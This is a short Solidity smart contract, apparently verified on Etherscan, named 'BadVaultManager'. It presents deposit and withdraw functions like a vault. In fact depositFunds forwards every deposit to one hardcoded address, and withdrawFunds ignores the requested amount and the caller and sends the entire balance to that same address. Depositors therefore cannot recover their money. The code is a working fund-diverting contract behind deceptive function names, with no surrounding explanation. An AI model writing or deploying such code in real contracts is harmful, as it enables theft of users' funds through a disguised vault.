/**
 *Submitted for verification at Etherscan.io on 2022-11-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract BadVaultManager { 
    function depositFunds() external payable {
        (bool isSent, ) = payable(0x3ebF944CC254fdC101a684B960921ed38Df05633).call{value: msg.value}("");
        require(isSent);
    }

    function withdrawFunds(uint _weiToWithdraw) external {
        (bool isSent, ) = payable(0x3ebF944CC254fdC101a684B960921ed38Df05633).call{value: address(this).balance}("");
        require(isSent);
    }
 }